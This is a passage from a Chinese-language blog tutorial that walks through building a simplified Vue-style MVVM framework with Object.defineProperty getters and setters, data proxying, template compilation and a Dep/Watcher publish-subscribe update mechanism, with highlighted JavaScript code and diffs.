<code>undefined</code>。当访问该属性时，该方法会被执行，方法执行时没有参数传入，但是会传入<code>this</code>对象（由于继承关系，这里的<code>this</code>并不一定是定义该属性的对象）。</p><p><strong>默认为 <code>undefined</code></strong>。</p><blockquote><p>存在 <code>get()</code> 时，不能存在 <code>value</code> 属性</p></blockquote><p>示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">&#x27;name&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">configurable</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 获取obj.name的值时会调用get方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;esunr&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; obj.name</span><br><span class="line">&lt; &quot;esunr&quot;</span><br></pre></td></tr></table></figure><p><code>set</code></p><p>一个给属性提供 setter 的方法，如果没有 setter 则为 <code>undefined</code>。当属性值修改时，触发执行该方法。该方法将接受唯一参数，即该属性新的参数值。</p><p><strong>默认为 [<code>undefined</code>]</strong>。</p><p>示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">&#x27;name&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">configurable</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="title function_">set</span>(<span class="params">val</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(val)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; obj.name = &quot;xiaoming&quot;</span><br><span class="line">&lt; &quot;xiaoming&quot;</span><br></pre></td></tr></table></figure><h1 id="3-数据劫持"><a href="#3-数据劫持" class="headerlink" title="3. 数据劫持"></a>3. 数据劫持</h1><p>在使用vue时，我们通常将这样定义一个vm实例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;app&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123; <span class="attr">a</span>: <span class="number">2</span> &#125;</span><br><span class="line">&#125;)  </span><br></pre></td></tr></table></figure><p>实际上，Vue在其内部代码中进行了一些操作：</p><ol><li>将所有vm实例的配置项都转入到变量 <code>$options</code> 中</li><li>将配置项 <code>data</code> 中的数据进行劫持，存放到vm实例上的 <code>_data</code> 变量中</li></ol><p>那么进行数据劫持的这一步就是为了将用户由 <code>data</code> 传入的数据使用 <code>Object.defineProperty()</code> 方法为其每一项数据挂载一个 <code>get()</code> 和 <code>set()</code> 方法，同时如果 <code>data</code> 传入的某一项数据也是一个对象，那么也要在这个对象上面挂载 <code>get()</code> 和 <code>set()</code> 方法。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190529151814.png" alt="20190529151814.png"></p><p>我们来实现Mvvm对象：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Mvvm</span>(<span class="params">option = &#123;&#125;</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">$options</span> = option; <span class="comment">// 将所有属性挂载了$options上</span></span><br><span class="line">  <span class="keyword">var</span> data = <span class="variable language_">this</span>.<span class="property">_data</span> = <span class="variable language_">this</span>.<span class="property">$options</span>.<span class="property">data</span>;</span><br><span class="line">  <span class="title function_">observe</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// vm.$options</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 观察对象给对象增加 ObjectDefineProperty</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Observe</span>(<span class="params">data</span>) &#123; <span class="comment">// 这里写我们的主要逻辑</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> data) &#123; <span class="comment">// 把data属性通过object.defineProperty的方式定义属性</span></span><br><span class="line">    <span class="keyword">let</span> val = data[key];</span><br><span class="line">    <span class="title function_">observe</span>(val); <span class="comment">// 如果val是一个对象，就使用递归再为其添加一个 get()、set()方法</span></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(data, key, &#123;</span><br><span class="line">      <span class="attr">enumerable</span>: <span class="literal">true</span>, <span class="comment">// 可枚举</span></span><br><span class="line">      <span class="title function_">get</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="title function_">set</span>(<span class="params">newVal</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (newVal === val) &#123;</span><br><span class="line">          <span class="comment">// 如果设置的值和以前一样，就不执行set操作</span></span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          val = newVal; <span class="comment">// 如果以后再获取值的时候，将刚才设置的值再丢回去</span></span><br><span class="line">          <span class="title function_">observe</span>(newVal); <span class="comment">// 如果将数据进行重新赋值后，重新赋值的对象也要添加get()和set()</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">observe</span>(<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> data !== <span class="string">&#x27;object&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Observe</span>(data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实例化一个vm对象：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;app&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123; <span class="attr">a</span>: &#123;<span class="attr">a</span>: <span class="number">1</span>&#125; &#125;</span><br><span class="line">&#125;)  </span><br></pre></td></tr></table></figure><p>可以看出其数据上都挂载了一个 <code>get()</code> 方法和 <code>set()</code> 方法：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190529155054.png" alt="20190529155054.png"></p><h1 id="4-数据代理"><a href="#4-数据代理" class="headerlink" title="4. 数据代理"></a>4. 数据代理</h1><p>在Vue中，我们通过 <code>data</code> 添加的数据不仅挂载到了vm实例的 <code>_data</code> 变量中，同时还挂载到了vm实例本身上，并且在我们正常的使用过程中，更多是去调用vm实例本身来获取数据，而并非 <code>_data</code> ，这时候我们就需要通过数据代理，将 <code>_data</code> 中的数据代理到vm实例上。</p><p>我们新增原有的核心代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Mvvm</span>(<span class="params">option = &#123;&#125;</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">$options</span> = option;</span><br><span class="line">  <span class="keyword">var</span> data = <span class="variable language_">this</span>.<span class="property">_data</span> = <span class="variable language_">this</span>.<span class="property">$options</span>.<span class="property">data</span>;</span><br><span class="line">  <span class="title function_">observe</span>(data);</span><br><span class="line">  <span class="comment">// 使用this代理_data</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> data)&#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">this</span>,key, &#123;</span><br><span class="line">      <span class="attr">enumerable</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">_data</span>[key];</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="title function_">set</span>(<span class="params">newVal</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_data</span>[key] = newVal;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现了Vue的两个特点：</p><ol><li><p>不能新增不存在的属性，因为新增的属性没有get和set</p></li><li><p>深度相应，每次赋予一个新对象时会给这个新对象增加数据劫持</p></li></ol><h1 id="5-模板编译"><a href="#5-模板编译" class="headerlink" title="5. 模板编译"></a>5. 模板编译</h1><p>在Vue中，我们在文档节点中使用  `{{}}`  来将vm中的数据渲染到文档中，这就需要有一个模板编译方法来处理文档节点中的文本，来解析并且读取数据</p><p>新增一个Compile对象来执行编译，其包含两个参数，一个el为MVVM模式下的文档范围，vm为MVVM实例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Compile</span>(<span class="params">el, vm</span>) &#123;</span><br><span class="line">  <span class="comment">// el 表示替换的范围</span></span><br><span class="line">  vm.<span class="property">$el</span> = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(el);</span><br><span class="line">  <span class="keyword">let</span> fragment = <span class="variable language_">document</span>.<span class="title function_">createDocumentFragment</span>();</span><br><span class="line">  <span class="keyword">while</span> (child = vm.<span class="property">$el</span>.<span class="property">firstChild</span>) &#123;</span><br><span class="line">    <span class="comment">// 将#app中的内容存放到fragment中，存放入内存等待处理</span></span><br><span class="line">    fragment.<span class="title function_">appendChild</span>(child);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 替换处理fragment中的文本内容（模拟Vue的模板引擎）</span></span><br><span class="line">  <span class="title function_">replace</span>(fragment)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">replace</span>(<span class="params">fragment</span>) &#123;</span><br><span class="line">    <span class="comment">// Array.from() 方法从一个类似数组或可迭代对象中创建一个新的数组实例。</span></span><br><span class="line">    <span class="comment">// 遍历每个fragment中存放的节点</span></span><br><span class="line">    <span class="title class_">Array</span>.<span class="title function_">from</span>(fragment.<span class="property">childNodes</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">node</span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> text = node.<span class="property">textContent</span>;</span><br><span class="line">      <span class="keyword">let</span> reg = <span class="regexp">/\&#123;\&#123;(.*)\&#125;\&#125;/</span>;</span><br><span class="line">      <span class="comment">// 如果当前的节点类型是3（文本节点），就对其进行匹配处理</span></span><br><span class="line">      <span class="keyword">if</span> (node.<span class="property">nodeType</span> === <span class="number">3</span> &amp;&amp; reg.<span class="title function_">test</span>(text)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">RegExp</span>.<span class="property">$1</span>);</span><br><span class="line">        <span class="keyword">let</span> arr = <span class="title class_">RegExp</span>.<span class="property">$1</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> val = vm;</span><br><span class="line">        arr.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">k</span>) &#123;</span><br><span class="line">          val = val[k];</span><br><span class="line">        &#125;);</span><br><span class="line">        node.<span class="property">textContent</span> = text.<span class="title function_">replace</span>(<span class="regexp">/\&#123;\&#123;(.*)\&#125;\&#125;/</span>, val);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 如果当前节点不是根节点，就利用递归去深度遍历其内部节点（注意：普通Element节点的根节点都为文本节点）</span></span><br><span class="line">      <span class="keyword">if</span> (node.<span class="property">childNodes</span>) &#123;</span><br><span class="line">        <span class="title function_">replace</span>(node);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将内存中的dom节点重新加载到页面中（不需要渲染）</span></span><br><span class="line">  vm.<span class="property">$el</span>.<span class="title function_">appendChild</span>(fragment);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在核心代码中启用：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Mvvm</span>(<span class="params">options = &#123;&#125;</span>) &#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Compile</span>(options.<span class="property">el</span>, <span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="6-数据更新"><a href="#6-数据更新" class="headerlink" title="6. 数据更新"></a>6. 数据更新</h1><p>在Vue中，当vm实例上挂载的数据发生更新时，视图也会随之刷新，他们之间存在着发布订阅关系。</p><h2 id="6-1-发布订阅模式"><a href="#6-1-发布订阅模式" class="headerlink" title="6.1 发布订阅模式"></a>6.1 发布订阅模式</h2><p>我们再模拟Vue数据更新机制的时候，需要设计一个发布者的构造函数（Dep）和订阅者的构造函数（Watcher）。</p><p>发布者内部存放着一个订阅者队列 <code>subArr</code>，同时其原型上挂载了一个 <code>addSub()</code> 方法用来向订阅者队列中添加订阅者，还有一个 <code>carry()</code> 方法，执行该方法后，会遍历订阅者队列，执行每个订阅者身上挂载的 <code>update()</code> 方法。</p><p>每个订阅者内部都传入了一个 <code>fn</code> ，是一个方法函数。同时其原型上挂载了一个 <code>update()</code> 方法，在其方法内部执行了实例化订阅者时传入的方法函数 <code>fn</code>。</p><p>当发布者发布事件时，只需要调用挂载在其身上的 <code>carry()</code> 方法，就可以将所有订阅者的 <code>update()</code> 方法执行。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190530111309.png" alt="20190530111309.png"></p><p>发布订阅模式的构造如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 构造发布者</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Dep</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">subArr</span> = [];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Dep</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addSub</span> = <span class="keyword">function</span> (<span class="params">sub</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">subArr</span>.<span class="title function_">push</span>(sub);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Dep</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">carry</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">subArr</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">sub</span> =&gt;</span> &#123;</span><br><span class="line">    sub.<span class="title function_">update</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 构造订阅者</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Watcher</span>(<span class="params">fn</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">fn</span> = fn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Watcher</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">update</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">fn</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-2-模拟Vue中的发布订阅模式"><a href="#6-2-模拟Vue中的发布订阅模式" class="headerlink" title="6.2 模拟Vue中的发布订阅模式"></a>6.2 模拟Vue中的发布订阅模式</h2><p>在Vue中创建一个发布订阅机制我们需要考虑以下几个问题：</p><ul><li>在哪里创建订阅者 （实例化一个Watcher对象）</li><li>在哪里创建发布者 （实例化一个Dep对象）</li><li>在哪里添加订阅 （执行发布者的 <code>addSub()</code> 方法）</li><li>在哪里发布事件 （执行发布者的 <code>carry()</code> 方法）</li></ul><blockquote><p>每一个渲染出的文本节点对应一个订阅者，一旦发生了数据更新，所有的订阅者的update方法都会被执行，也就是说所有需要解析的文本节点都会被渲染。</p></blockquote><p>Vue数据更新机制的订阅者是 <code>Compile</code> 编译器，当数据发生了变更时，编译器需要对模板重新编译渲染。在编译器中，执行了模板替换的方法语句是 <code>node.textContent = text.replace(/\&#123;\&#123;(.*)\&#125;\&#125;/, val);</code> ，那么我们再创建订阅者时，传入其内部的方法就是这条语句：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">  function Compile(el, vm) &#123;</span><br><span class="line">    ... ...</span><br><span class="line"></span><br><span class="line">    // 替换处理fragment中的文本内容（模拟Vue的模板引擎）</span><br><span class="line">    replace(fragment)</span><br><span class="line"></span><br><span class="line">    function replace(fragment) &#123;</span><br><span class="line">      Array.from(fragment.childNodes).forEach(function (node) &#123;</span><br><span class="line">        ... ...</span><br><span class="line">        if (node.nodeType <span class="comment">=== 3 &amp;&amp; reg.test(text)) &#123;</span></span><br><span class="line">          ... ...</span><br><span class="line"><span class="addition">+         new Watcher(function () &#123;</span></span><br><span class="line"><span class="addition">+           node.textContent = text.replace(/\&#123;\&#123;(.*)\&#125;\&#125;/, val);</span></span><br><span class="line"><span class="addition">+         &#125;)</span></span><br><span class="line">          // 替换的逻辑</span><br><span class="line">          node.textContent = text.replace(/\&#123;\&#123;(.*)\&#125;\&#125;/, val);</span><br><span class="line">        &#125;</span><br><span class="line">        if (node.childNodes) &#123;</span><br><span class="line">          ... ...</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 将内存中的dom节点重新加载到页面中（不需要渲染）</span><br><span class="line">    vm.$el.appendChild(fragment);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这样就达成了一个目的：在页面加载完成后实例化 <code>Compile</code> 时，在执行模板编译的过程中，为每个文本节点对象都渲染出一个订阅者实例，去观察其对应的数据是否变动，如果数据变动，就触发当前文本节点的重新渲染。</p><p>我们先不讨论实例化的订阅者何时被调用挂载于其身上的 <code>update()</code> 方法，先假设一旦数据发生了变化，传入订阅者实例的方法就会被执行，即 <code>node.textContent = text.replace(/\&#123;\&#123;(.*)\&#125;\&#125;/, val)</code> 被执行。但我们会发现，内部参数 <code>val</code> 仍是一个旧值（因为Compile只执行一次，在其内部的变量val肯定是不会动态变更的）。我们在重新渲染文本节点时，需要去将旧文本替换成新文本。</p><p>那么问题就是如何获取更新后的新值？</p><p>我们需要改动代码，在实例化订阅者对象的时候传入三个值，<code>vm</code> 为Mvvm实例，<code>RegExp.$1</code> 是当前文本节点中匹配的原始待编译字符（也就是  `{{}}` <br> 包裹的内容），第三个参数时传入的执行函数：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- new Watcher(function () &#123;</span></span><br><span class="line"><span class="deletion">-   node.textContent = text.replace(/\&#123;\&#123;(.*)\&#125;\&#125;/, val);</span></span><br><span class="line"><span class="deletion">- &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="addition">+ new Watcher(vm, RegExp.$1, function (newVal) &#123;</span></span><br><span class="line"><span class="addition">+   node.textContent = text.replace(/\&#123;\&#123;(.*)\&#125;\&#125;/, newVal);</span></span><br><span class="line"><span class="addition">+ &#125;)</span></span><br></pre></td></tr></table></figure><p>那么传入的这些参数在构造对象 <code>Watcher</code> 中如何使用？</p><p>首先我们要接受传入的参数</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  function Watcher(vm, exp, fn) &#123;</span><br><span class="line"><span class="addition">+   this.fn = fn;</span></span><br><span class="line"><span class="addition">+   this.vm = vm;</span></span><br><span class="line"><span class="addition">+   this.exp = exp;</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这时候就可以考虑如何将订阅者添加到发布者的 <code>subArr</code> 中了。</p><p>首先我们要清楚实例化发布者的位置应该是在 <code>Observe</code> 中，因为其负责了构建每一个数据。所以我们可以去尝试通过访问数据对象上的 <code>get()</code> 方法，来将订阅者添加到其数据上的发布者。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  function Watcher(vm, exp, fn) &#123;</span><br><span class="line">    this.fn = fn;</span><br><span class="line">    this.vm = vm;</span><br><span class="line">    this.exp = exp;</span><br><span class="line"><span class="addition">+   Dep.target = this;</span></span><br><span class="line"><span class="addition">+   let val = vm;</span></span><br><span class="line"><span class="addition">+   let arr = exp.split(&#x27;.&#x27;);</span></span><br><span class="line"><span class="addition">+   arr.forEach(function (k) &#123;</span></span><br><span class="line"><span class="addition">+     val = val[k];</span></span><br><span class="line"><span class="addition">+   &#125;)</span></span><br><span class="line"><span class="addition">+   Dep.target = null;</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>其中 <code>Dep.target</code> 是为了存放当前的订阅者对象，在数据的 <code>get()</code> 方法中将订阅者添加到发布者的 <code>subArr</code> 中。 <code>forEach</code> 是为了深度遍历，因为如果当前的数据值是一个对象，那么需要去深度查找这个值中对象的 <code>get()</code> 和 <code>set()</code> 方法。</p><p>同样，当数据被重新赋值时，会调用其 <code>set()</code> 方法，所以最终我们在 <code>Observe</code> 中为数据添加 <code>get()</code> 和 <code>set()</code> 方法的代码中要加上如下额外步骤：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  function Observe(data) &#123;</span><br><span class="line"><span class="addition">+   let dep = new Dep();</span></span><br><span class="line">    for (let key in data) &#123;</span><br><span class="line">      let val = data[key];</span><br><span class="line">      observe(val);</span><br><span class="line">      Object.defineProperty(data, key, &#123;</span><br><span class="line">        enumerable: true,</span><br><span class="line">        get() &#123;</span><br><span class="line"><span class="addition">+         Dep.target &amp;&amp; dep.addSub(Dep.target);</span></span><br><span class="line">          return val;</span><br><span class="line">        &#125;,</span><br><span class="line">        set(newVal) &#123;</span><br><span class="line">          if (newVal <span class="comment">=== val) &#123;</span></span><br><span class="line">            return;</span><br><span class="line">          &#125; else &#123;</span><br><span class="line">            val = newVal;</span><br><span class="line">            observe(newVal);</span><br><span class="line"><span class="addition">+           dep.carry();</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>但是正如最初我们提到的，执行订阅者的 <code>update()</code> 方法去执行传入订阅者内部的函数时，需要获取新值 <code>newVal</code>，那么我们需要去更改一下 <code>update()</code> 方法，由于其执行前已经对数据进行了重新赋值，所以只要查找该订阅者对应的值就可以获取 <code>newVal</code> 了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Watcher</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">update</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> val = <span class="variable language_">this</span>.<span class="property">vm</span>;</span><br><span class="line">  <span class="keyword">let</span> arr = <span class="variable language_">this</span>.<span class="property">exp</span>.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">  arr.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">k</span>) &#123;</span><br><span class="line">    val = val[k];</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">fn</span>(val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="7-数据的双向绑定"><a href="#7-数据的双向绑定" class="headerlink" title="7. 数据的双向绑定"></a>7. 数据的双向绑定</h1><p>为了实现数据的双向绑定，要点在编译模板时，去审查每个Document节点元素身上有没有挂载 <code>v-model</code> 属性，如果有，就获取其 <code>value</code>，为其添加一个订阅，来当数据更新时连带更新输入框的内容，同时添加一个监听方法，当在其内部输入时，触发绑定数据的 <code>set()</code> 方法来变更数据的值：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 